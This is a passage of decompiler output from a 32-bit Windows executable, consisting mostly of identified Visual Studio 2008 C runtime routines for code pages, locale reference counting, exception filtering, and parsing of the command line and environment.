                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_0040fc06;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_0040fc06:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2008 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00422c74) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_00422b78) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_00422750)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_00422b78;
      lpAddend = (pthreadmbcinfo)PTR_DAT_00422b78;
      InterlockedIncrement((LONG *)PTR_DAT_00422b78);
    }
    FUN_0040fd1d();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_0040fd1d(void)

{
  FUN_0040e64c(0xd);
  return;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2008 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_00423c64 = 0;
  if (unaff_ESI == -2) {
    DAT_00423c64 = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_00423c64 = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_00423c64 = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_00423c64 = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2008 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  BOOL BVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  int extraout_ECX;
  undefined2 *puVar9;
  int iVar10;
  undefined4 extraout_EDX;
  BYTE *pBVar11;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  uVar4 = getSystemCP((int)unaff_EDI);
  if (uVar4 != 0) {
    local_20 = (byte *)0x0;
    uVar5 = 0;
LAB_0040fde0:
    if (*(uint *)((int)&DAT_00422b80 + uVar5) != uVar4) goto code_r0x0040fdec;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_00422b90 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar5 = (uint)*pbVar8; uVar5 <= bVar3; uVar5 = uVar5 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar5);
          *pbVar2 = *pbVar2 | (&DAT_00422b7c)[local_24];
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar10 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar10;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar9 = (undefined2 *)(&DAT_00422b84 + extraout_ECX);
    iVar10 = 6;
    do {
      *puVar7 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar7 = puVar7 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_0040ff11;
  }
LAB_0040fdcd:
  setSBCS(unaff_EDI);
LAB_0040ff78:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x0040fdec:
  local_20 = (byte *)((int)local_20 + 1);
  uVar5 = uVar5 + 0x30;
  if (0xef < uVar5) goto code_r0x0040fdf9;
  goto LAB_0040fde0;
code_r0x0040fdf9:
  if (((uVar4 == 65000) || (uVar4 == 0xfde9)) ||
     (BVar6 = IsValidCodePage(uVar4 & 0xffff), BVar6 == 0)) goto LAB_0040ff78;
  BVar6 = GetCPInfo(uVar4,&local_1c);
  if (BVar6 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar11 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar11;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar11[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar11 + 1;
          pBVar11 = pBVar11 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar10 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar10 = iVar10 + -1;
      } while (iVar10 != 0);
      iVar10 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar10;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_0040ff11:
    setSBUpLow(unaff_EDI);
    goto LAB_0040ff78;
  }
  if (DAT_00423c64 == 0) goto LAB_0040ff78;
  goto LAB_0040fdcd;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_0040ff88(undefined4 param_1)

{
  _ptiddata p_Var1;
  int iVar2;
  pthreadmbcinfo ptVar3;
  LONG LVar4;
  int *piVar5;
  int iVar6;
  pthreadmbcinfo ptVar7;
  pthreadmbcinfo ptVar8;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar3 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(in_stack_ffffffc8);
  if (iVar2 == ptVar3->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar7 = p_Var1->ptmbcinfo;
      ptVar8 = ptVar3;
      for (iVar6 = 0x88; iVar6 != 0; iVar6 = iVar6 + -1) {
        ptVar8->refcount = ptVar7->refcount;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
        ptVar8 = (pthreadmbcinfo)&ptVar8->mbcodepage;
      }
      ptVar3->refcount = 0;
      local_24 = __setmbcp_nolock(iVar2,(int)ptVar3);
      if (local_24 == 0) {
        LVar4 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar4 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_00422750)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        InterlockedIncrement((LONG *)ptVar3);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_00422c74 & 1) == 0)) {
          __lock(0xd);
          _DAT_00423c74 = ptVar3->mbcodepage;
          _DAT_00423c78 = ptVar3->ismbcodepage;
          _DAT_00423c7c = *(undefined4 *)ptVar3->mbulinfo;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_00423c68)[iVar2] = ptVar3->mbulinfo[iVar2 + 2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_00422970)[iVar2] = ptVar3->mbctype[iVar2 + 4];
          }
          for (iVar2 = 0; iVar2 < 0x100; iVar2 = iVar2 + 1) {
            (&DAT_00422a78)[iVar2] = ptVar3->mbcasemap[iVar2 + 4];
          }
          LVar4 = InterlockedDecrement((LONG *)PTR_DAT_00422b78);
          if ((LVar4 == 0) && (PTR_DAT_00422b78 != &DAT_00422750)) {
            _free(PTR_DAT_00422b78);
          }
          PTR_DAT_00422b78 = (undefined *)ptVar3;
          InterlockedIncrement((LONG *)ptVar3);
          FUN_004100e9();
        }
      }
      else if (local_24 == -1) {
        if (ptVar3 != (pthreadmbcinfo)&DAT_00422750) {
          _free(ptVar3);
        }
        piVar5 = __errno();
        *piVar5 = 0x16;
      }
    }
  }
  return local_24;
}



void FUN_004100e9(void)

{
  FUN_0040e64c(0xd);
  return;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2008 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  int **ppiVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_00422ee8)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)(void **)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_00422e28) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar3 = (int **)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar3[-2] != (int *)&DAT_00422c78) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar3[-1] != (int *)0x0) && (piVar1 = ppiVar3[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar3 = ppiVar3 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2008 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_00422c78) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2008 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_00422c78) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2008 Release

LONG * __updatetlocinfoEx_nolock(void)

{
  LONG *pLVar1;
  LONG **in_EAX;
  LONG *unaff_EDI;
  
  if ((unaff_EDI != (LONG *)0x0) && (in_EAX != (LONG **)0x0)) {
    pLVar1 = *in_EAX;
    if (pLVar1 != unaff_EDI) {
      *in_EAX = unaff_EDI;
      ___addlocaleref(unaff_EDI);
      if (pLVar1 != (LONG *)0x0) {
        ___removelocaleref(pLVar1);
        if ((*pLVar1 == 0) && (pLVar1 != (LONG *)&DAT_00422c80)) {
          ___freetlocinfo(pLVar1);
        }
      }
    }
    return unaff_EDI;
  }
  return (LONG *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2008 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00422c74) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    __updatetlocinfoEx_nolock();
    FUN_00410459();
  }
  else {
    p_Var1 = __getptd();
    p_Var1 = (_ptiddata)p_Var1->ptlocinfo;
  }
  if (p_Var1 == (_ptiddata)0x0) {
    __amsg_exit(0x20);
  }
  return (pthreadlocinfo)p_Var1;
}



void FUN_00410459(void)

{
  FUN_0040e64c(0xc);
  return;
}



// Library Function - Single Match
//  __towlower_l
// 
// Library: Visual Studio 2008 Release

wint_t __cdecl __towlower_l(wint_t _C,_locale_t _Locale)

{
  wchar_t *_DWMapFlag;
  wint_t wVar1;
  int iVar2;
  undefined2 in_stack_00000006;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ushort local_8 [2];
  
  wVar1 = 0xffff;
  if (_C != 0xffff) {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,_Locale);
    _DWMapFlag = (local_18.locinfo)->lc_category[0].wlocale;
    if (_DWMapFlag == (wchar_t *)0x0) {
      wVar1 = _C;
      if ((ushort)(_C - 0x41) < 0x1a) {
        wVar1 = _C + 0x20;
      }
    }
    else if (_C < 0x100) {
      iVar2 = __iswctype_l(_C,1,&local_18);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = (wint_t)*(byte *)((int)local_18.locinfo[1].lc_category[0].wlocale + (__C & 0xffff));
      }
    }
    else {
      iVar2 = ___crtLCMapStringW((LPCWSTR)&local_18,(DWORD)_DWMapFlag,(LPCWSTR)0x100,(int)&_C,
                                 (LPWSTR)0x1,(int)local_8);
      wVar1 = _C;
      if (iVar2 != 0) {
        wVar1 = local_8[0];
      }
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
  }
  return wVar1;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  return 0;
}



// Library Function - Single Match
//  __XcptFilter
// 
// Library: Visual Studio 2008 Release

int __cdecl __XcptFilter(ulong _ExceptionNum,_EXCEPTION_POINTERS *_ExceptionPtr)

{
  ulong *puVar1;
  code *pcVar2;
  void *pvVar3;
  ulong uVar4;
  _ptiddata p_Var5;
  ulong *puVar6;
  int iVar7;
  int iVar8;
  
  p_Var5 = __getptd_noexit();
  if (p_Var5 != (_ptiddata)0x0) {
    puVar1 = (ulong *)p_Var5->_pxcptacttab;
    puVar6 = puVar1;
    do {
      if (*puVar6 == _ExceptionNum) break;
      puVar6 = puVar6 + 3;
    } while (puVar6 < puVar1 + DAT_00422d74 * 3);
    if ((puVar1 + DAT_00422d74 * 3 <= puVar6) || (*puVar6 != _ExceptionNum)) {
      puVar6 = (ulong *)0x0;
    }
    if ((puVar6 == (ulong *)0x0) || (pcVar2 = (code *)puVar6[2], pcVar2 == (code *)0x0)) {
      p_Var5 = (_ptiddata)0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      puVar6[2] = 0;
      p_Var5 = (_ptiddata)0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        pvVar3 = p_Var5->_tpxcptinfoptrs;
        p_Var5->_tpxcptinfoptrs = _ExceptionPtr;
        if (puVar6[1] == 8) {
          if (DAT_00422d68 < DAT_00422d6c + DAT_00422d68) {
            iVar7 = DAT_00422d68 * 0xc;
            iVar8 = DAT_00422d68;
            do {
              *(undefined4 *)(iVar7 + 8 + (int)p_Var5->_pxcptacttab) = 0;
              iVar8 = iVar8 + 1;
              iVar7 = iVar7 + 0xc;
            } while (iVar8 < DAT_00422d6c + DAT_00422d68);
          }
          uVar4 = *puVar6;
          iVar8 = p_Var5->_tfpecode;
          if (uVar4 == 0xc000008e) {
            p_Var5->_tfpecode = 0x83;
          }
          else if (uVar4 == 0xc0000090) {
            p_Var5->_tfpecode = 0x81;
          }
          else if (uVar4 == 0xc0000091) {
            p_Var5->_tfpecode = 0x84;
          }
          else if (uVar4 == 0xc0000093) {
            p_Var5->_tfpecode = 0x85;
          }
          else if (uVar4 == 0xc000008d) {
            p_Var5->_tfpecode = 0x82;
          }
          else if (uVar4 == 0xc000008f) {
            p_Var5->_tfpecode = 0x86;
          }
          else if (uVar4 == 0xc0000092) {
            p_Var5->_tfpecode = 0x8a;
          }
          (*pcVar2)(8,p_Var5->_tfpecode);
          p_Var5->_tfpecode = iVar8;
        }
        else {
          puVar6[2] = 0;
          (*pcVar2)(puVar6[1]);
        }
        p_Var5->_tpxcptinfoptrs = pvVar3;
      }
      p_Var5 = (_ptiddata)0xffffffff;
    }
  }
  return (int)p_Var5;
}



// Library Function - Single Match
//  __wwincmdln
// 
// Library: Visual Studio 2008 Release

void __wwincmdln(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_00426124;
  if (DAT_00426124 == (ushort *)0x0) {
    puVar3 = &DAT_0041dce8;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetenvp
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetenvp(void)

{
  int iVar1;
  wchar_t **ppwVar2;
  wchar_t *_Dst;
  errno_t eVar3;
  wchar_t *pwVar4;
  int iVar5;
  size_t _Count;
  
  iVar5 = 0;
  pwVar4 = DAT_00423474;
  if (DAT_00423474 == (wchar_t *)0x0) {
    iVar5 = -1;
  }
  else {
    for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + iVar1 + 1) {
      if (*pwVar4 != L'=') {
        iVar5 = iVar5 + 1;
      }
      iVar1 = FUN_004150f7(pwVar4);
    }
    ppwVar2 = (wchar_t **)__calloc_crt(iVar5 + 1,4);
    pwVar4 = DAT_00423474;
    DAT_0042392c = ppwVar2;
    if (ppwVar2 == (wchar_t **)0x0) {
      iVar5 = -1;
    }
    else {
      for (; *pwVar4 != L'\0'; pwVar4 = pwVar4 + _Count) {
        iVar5 = FUN_004150f7(pwVar4);
        _Count = iVar5 + 1;
        if (*pwVar4 != L'=') {
          _Dst = (wchar_t *)__calloc_crt(_Count,2);
          *ppwVar2 = _Dst;
          if (_Dst == (wchar_t *)0x0) {
            _free(DAT_0042392c);
            DAT_0042392c = (wchar_t **)0x0;
            return -1;
          }
          eVar3 = _wcscpy_s(_Dst,_Count,pwVar4);
          if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          }
          ppwVar2 = ppwVar2 + 1;
        }
      }
      _free(DAT_00423474);
      DAT_00423474 = (wchar_t *)0x0;
      *ppwVar2 = (wchar_t *)0x0;
      _DAT_004250e0 = 1;
      iVar5 = 0;
    }
  }
  return iVar5;
}



// Library Function - Single Match
//  _wparse_cmdline
// 
// Library: Visual Studio 2008 Release

void __thiscall _wparse_cmdline(void *this,short **param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short *psVar3;
  short sVar4;
  uint uVar5;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)this;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar4 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if ((short *)this != (short *)0x0) {
        *(short *)this = *in_EAX;
        this = (void *)((int)this + 2);
      }
      sVar4 = *in_EAX;
      if (sVar4 == 0) goto LAB_0041085e;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar4 != 0x20 && (sVar4 != 9))));
  if ((short *)this != (short *)0x0) {
    *(short *)((int)this + -2) = 0;
  }
LAB_0041085e:
  bVar1 = false;
  while (psVar3 = in_EAX, *in_EAX != 0) {
    for (; (*psVar3 == 0x20 || (*psVar3 == 9)); psVar3 = psVar3 + 1) {
    }
    if (*psVar3 == 0) break;
    if (param_1 != (short **)0x0) {
      *param_1 = (short *)this;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar5 = 0;
      for (; *psVar3 == 0x5c; psVar3 = psVar3 + 1) {
        uVar5 = uVar5 + 1;
      }
      in_EAX = psVar3;
      if (*psVar3 == 0x22) {
        if (((uVar5 & 1) == 0) && ((!bVar1 || (in_EAX = psVar3 + 1, *in_EAX != 0x22)))) {
          bVar2 = false;
          bVar1 = !bVar1;
          in_EAX = psVar3;
        }
        uVar5 = uVar5 >> 1;
      }
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        if ((short *)this != (short *)0x0) {
          *(short *)this = 0x5c;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar4 = *in_EAX;
      if ((sVar4 == 0) || ((!bVar1 && ((sVar4 == 0x20 || (sVar4 == 9)))))) break;
      if (bVar2) {
        if ((short *)this != (short *)0x0) {
          *(short *)this = sVar4;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      psVar3 = in_EAX + 1;
    }
    if ((short *)this != (short *)0x0) {
      *(short *)this = 0;
      this = (void *)((int)this + 2);
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)0x0;
  }
  *param_2 = *param_2 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wsetargv
// 
// Library: Visual Studio 2008 Release

int __cdecl __wsetargv(void)

{
  uint _Size;
  uint uVar1;
  short **ppsVar2;
  int iVar3;
  uint in_ECX;
  uint local_8;
  
  _DAT_00423eb0 = 0;
  local_8 = in_ECX;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_00423ca8,0x104);
  _DAT_00423938 = &DAT_00423ca8;
  _wparse_cmdline((void *)0x0,(short **)0x0,(int *)&local_8);
  uVar1 = local_8;
  if ((((local_8 < 0x3fffffff) && (in_ECX < 0x7fffffff)) &&
      (_Size = (in_ECX + local_8 * 2) * 2, in_ECX * 2 <= _Size)) &&
     (ppsVar2 = (short **)__malloc_crt(_Size), ppsVar2 != (short **)0x0)) {
    _wparse_cmdline(ppsVar2 + uVar1,ppsVar2,(int *)&local_8);
    _DAT_00423918 = local_8 - 1;
    iVar3 = 0;
    _DAT_00423920 = ppsVar2;
  }
  else {
    iVar3 = -1;
  }
  return iVar3;
}



// Library Function - Single Match
//  ___crtGetEnvironmentStringsW
// 
// Library: Visual Studio 2008 Release

LPVOID __cdecl ___crtGetEnvironmentStringsW(void)

{
  WCHAR WVar1;
  LPWCH _Src;
  WCHAR *pWVar2;
  WCHAR *pWVar3;
  size_t _Size;
  void *_Dst;
  
  _Src = GetEnvironmentStringsW();
  if (_Src != (LPWCH)0x0) {
    WVar1 = *_Src;
    pWVar3 = _Src;
    while (WVar1 != L'\0') {
      do {
        pWVar2 = pWVar3;
        pWVar3 = pWVar2 + 1;
      } while (*pWVar3 != L'\0');
      pWVar3 = pWVar2 + 2;
      WVar1 = *pWVar3;
    }
    _Size = (int)pWVar3 + (2 - (int)_Src);
    _Dst = __malloc_crt(_Size);
    if (_Dst != (void *)0x0) {
      _memcpy(_Dst,_Src,_Size);
    }
    FreeEnvironmentStringsW(_Src);
    return _Dst;
  }
  return (LPVOID)0x0;
}



LPWSTR GetCommandLineW(void)

{
  LPWSTR pWVar1;
  
                    // WARNING: Could not recover jumptable at 0x00410a44. Too many branches
                    // WARNING: Treating indirect jump as call
  pWVar1 = GetCommandLineW();
  return pWVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __ioinit(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT *pUVar6;
  int iVar7;
  HANDLE *ppvVar8;
  UINT UVar9;
  UINT UVar10;
  _STARTUPINFOA local_68;
  uint local_24;
